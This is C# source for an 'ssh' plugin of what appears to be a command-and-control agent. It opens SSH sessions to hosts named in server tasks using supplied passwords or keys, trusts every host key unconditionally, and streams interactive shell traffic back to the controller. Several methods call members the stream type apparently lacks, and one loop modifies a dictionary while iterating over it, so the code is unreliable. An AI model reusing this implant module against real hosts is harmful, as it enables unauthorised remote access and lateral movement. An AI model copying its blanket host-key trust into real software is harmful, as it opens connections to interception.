using Renci.SshNet;
using System.Text;
using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;
using ssh;
using System.Text.Json;
using System.IO;

namespace Agent
{
    public class Plugin : IPlugin, IInteractivePlugin
    {
        public string Name => "ssh";
        Dictionary<string, ShellStream> sessions = new Dictionary<string, ShellStream>();
        string currentSession = "";
        private IMessageManager messageManager { get; set; }

        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager)
        {
            this.messageManager = messageManager;
        }
        public async Task Execute(ServerJob job)
        {
            //Dictionary<string, string> args = Misc.ConvertJsonStringToDict(job.task.parameters);
            SshArgs args = JsonSerializer.Deserialize<SshArgs>(job.task.parameters);
            
            if(string.IsNullOrEmpty(args.username) || string.IsNullOrEmpty(args.password) || string.IsNullOrEmpty(args.hostname)) {
                return;
            }

            this.Connect(args, job.task.id);
        }
        private void Connect(SshArgs args, string task_id)
        {
            ConnectionInfo connectionInfo;
            int port = this.GetPortFromHost(args.hostname);

            ConnectionInfo ci = null;
            if (!string.IsNullOrEmpty(args.keypath))
            {
                ci = this.ConnectWithKey(args, port);
            }
            else
            {
                ci = this.ConnectWithUsernamePass(args, port);
            }

            SshClient sshClient = new SshClient(ci);
            sshClient.HostKeyReceived += (sender, e) =>
            {
                e.CanTrust = true;
            };

            try
            {
                sshClient.Connect();
            }
            catch (Exception e)
            {
                this.messageManager.AddResponse(new ResponseResult
                {
                    task_id = task_id,
                    process_response = new Dictionary<string, string> { { "message", e.ToString() } },
                    completed = true,
                });
            }

            if (sshClient.IsConnected)
            {
                var stream = sshClient.CreateShellStream("", 80, 30, 0, 0, 0);
                stream.DataReceived += (sender, e) =>
                {
                    messageManager.AddResponse(new InteractMessage()
                    {
                        data = Misc.Base64Encode(e.Data),
                        task_id = task_id,
                        message_type = InteractiveMessageType.Output
                    });
                };

                sessions.Add(task_id, stream);

                return;
            }

            this.messageManager.AddResponse(new ResponseResult
            {
                task_id = task_id,
                process_response = new Dictionary<string, string> { { "message", "0x31" } },
                completed = true,
            });

        }

        private int GetPortFromHost(string host)
        {
            if (host.Contains(':'))
            {
                string[] hostParts = host.Split(':');
                return int.Parse(hostParts[1]);
            }
            return 22;
        }

        private ConnectionInfo ConnectWithKey(SshArgs args, int port)
        {
            PrivateKeyFile pk;
            if (!string.IsNullOrEmpty(args.password))
            {
                pk = new PrivateKeyFile(args.keypath, args.password);
            }
            else
            {
                pk = new PrivateKeyFile(args.keypath);
            }

            AuthenticationMethod am = new PrivateKeyAuthenticationMethod(args.username, new PrivateKeyFile[] {pk });
            return new ConnectionInfo(args.hostname, port, args.username, am);
        }
        private ConnectionInfo ConnectWithUsernamePass(SshArgs args, int port)
        {
            PasswordAuthenticationMethod authenticationMethod = new PasswordAuthenticationMethod(args.username, args.password);
            return new ConnectionInfo(args.hostname, port, args.username, authenticationMethod);
        }

        ResponseResult Disconnect(Dictionary<string, string> args, string task_id)
        {
            string session;
            if (String.IsNullOrEmpty(args["session"]))
            {
                session = currentSession;
            }
            else
            {
                session = args["session"];
            }


            if (!sessions.ContainsKey(session))
            {
                return new ResponseResult
                {
                    task_id = task_id,
                    process_response = new Dictionary<string, string> { { "message", "0x2D" } },
                    completed = true,
                    status = "error"
                };
            }
            if (!sessions[session].IsConnected)
            {
                sessions.Remove(session);
                return new ResponseResult
                {
                    task_id = task_id,
                    process_response = new Dictionary<string, string> { { "message", "0x32" } },
                    completed = true
                };
            }

            sessions[session].Disconnect();

            if (!sessions[session].IsConnected)
            {
                sessions.Remove(session);
                return new ResponseResult
                {
                    task_id = task_id,
                    process_response = new Dictionary<string, string> { { "message", "0x33" } },
                    completed = true,
                };
            }
            else
            {
                return new ResponseResult
                {
                    task_id = task_id,
                    process_response = new Dictionary<string, string> { { "message", "0x34" } },
                    completed = true,
                    status = "error",
                };
            }
        }
        ResponseResult RunCommand(Dictionary<string, string> args, string task_id)
        {
            StringBuilder sb = new StringBuilder();
            string command = args["command"];

            if (sessions[currentSession] is null || !sessions[currentSession].IsConnected)
            {
                return new ResponseResult
                {
                    task_id = task_id,
                    process_response = new Dictionary<string, string> { { "message", "0x37" } },
                    completed = true,
                    status = "error"
                };
            }

            if (string.IsNullOrEmpty(command))
            {
                return new ResponseResult
                {
                    task_id = task_id,
                    process_response = new Dictionary<string, string> { { "message", "0x38" } },
                    completed = true,
                    status = "error"
                };
            }

            SshCommand sc = sessions[currentSession].CreateCommand(command);
            sc.Execute();

            if (sc.ExitStatus != 0)
            {
                sb.AppendLine(sc.Result);
                sb.AppendLine(sc.Error);
                sb.AppendLine($"Exited with code: {sc.ExitStatus}");
            }
            else
            {
                sb.AppendLine(sc.Result);
            }

            return new ResponseResult
            {
                user_output = sb.ToString(),
                completed = true,
                task_id = task_id
            };
        }
        ResponseResult ListSessions(Dictionary<string, string> args, string task_id)
        {
            StringBuilder sb = new StringBuilder();
            sb.AppendLine("Active Sessions");
            sb.AppendLine("--------------------------");
            foreach (var sshClient in sessions)
            {
                if (sshClient.Value.IsConnected)
                {
                    sb.AppendLine($"Active - {sshClient.Key} - {sshClient.Value.ConnectionInfo.Username}@{sshClient.Value.ConnectionInfo.Host}");
                }
                else
                {
                    sessions.Remove(sshClient.Key);
                }
            }

            return new ResponseResult
            {
                task_id = task_id,
                user_output = sb.ToString(),
                completed = true,
            };
        }

        public void Interact(InteractMessage message)
        {
            switch (message.message_type)
            {
                case InteractiveMessageType.Input:
                    this.sessions[message.task_id].Write(Misc.Base64Decode(message.data));
                    break;
                default:
                    this.sessions[message.task_id].Write(Misc.Base64Decode(message.data));
                    break;
            }
        }
    }
}


